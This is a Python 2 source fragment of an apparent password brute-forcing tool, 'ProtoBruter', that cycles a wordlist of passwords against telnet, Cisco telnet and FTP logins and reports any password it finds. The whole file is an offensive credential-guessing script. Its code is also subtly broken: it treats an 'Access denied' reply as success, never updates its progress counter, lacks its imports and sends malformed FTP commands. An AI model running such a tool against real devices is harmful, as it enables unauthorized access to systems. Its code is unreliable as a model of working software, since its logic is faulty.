#!/usr/bin/python
# -*- coding: utf-8 -*-
# sha0@badchecksum.net

__version__ = "$Revision: 0004000 $"
class ProtoBruter(Conn,Wordlist):				#def 	
	def __init__(self,host,port):
		Conn.__init__(self)
		Wordlist.__init__(self)
		self.user = 'admin'
		self.sameuserpass = 0
		self.thost = host
		self.tport = port
		self.passwords = []
		#self.sock.timeout(1)

	def __del__(self):
		self.close()

	def telnet(self):
		progress = 0
		l = len(self.words)

		denied = re.compile('Access denied')
		for i in range(0,l-1,2):
			if not self.connect(self.thost,self.tport):
				print 'Cannot Connect'
				return 0

			w = self.words[i]
			self.sock.recv(666)
			if self.sameuserpass:
				self.sock.send(w+'\r\n')
				self.sock.recv(666)
			else:
				self.sock.send(self.user+'\r\n')
				self.sock.recv(666)

			self.sock.send(w+'\r\n')
			d = self.sock.recv(666)
			if denied.findall(d):
				print '1>'+d
				self.passwords.append(w)
				print 'Password: '+w
				return w

			self.close()
			sys.stdout.write(str(progress*100/l)+'% '+w+'               \r')
			sys.stdout.flush()



	def telnetCisco(self):
		tm_inicial	= 18
		tm_secundario	= 12
		tm_denied_cont	= 32
		progress = 0
		l = len(self.words)

		denied = re.compile('Access denied')
		for i in range(0,l-1,2):
			if not self.connect(self.thost,self.tport):
				print 'Cannot Connect'
				return 0

			w = self.words[i]
			self.sock.recv(tm_inicial)
			if self.sameuserpass:
				self.sock.send(w+'\r\n')
				self.sock.recv(tm_secundario+len(w))
			else:
				self.sock.send(self.user+'\r\n')
				self.sock.recv(tm_secundario+len(self.user))
			self.sock.send(w+'\r\n')
			d = self.sock.recv(tm_denied_cont)
			if denied.findall(d):
				print '1>'+d
				self.passwords.append(w)
				print 'Password: '+w
				return w

			sys.stdout.write(str(progress*100/l)+'% '+w+'               \r')
			sys.stdout.flush()

			w = self.words[i+1]
			if self.sameuserpass:
				self.sock.send(w+'\r\n')
				self.sock.recv(tm_secundario+len(w))
			else:
				self.sock.send(self.user+'\r\n')
				self.sock.recv(tm_secundario+len(self.user))
			self.sock.recv(tm_secundario+len(self.user))
			self.sock.send(w+'\r\n')
			d = self.sock.recv(tm_denied_cont)
			if denied.findall(d):
				print '2>'+d
				self.passwords.append(w)
				print 'Password: '+w
				return w

			self.close()

			sys.stdout.write(str(progress*100/l)+'% '+w+'               \r')
			sys.stdout.flush()

		print	

	def ftp(self):
		print self.send('AUTH SSL\r\n')
		print self.send('AUTH TLS\r\n')
		for w in self.words:
			out = self.send('USER: '+w+'\r\n')
			print w+': '+out
			out = self.send('PASS: '+w+'\r\n')
			print w+': '+out

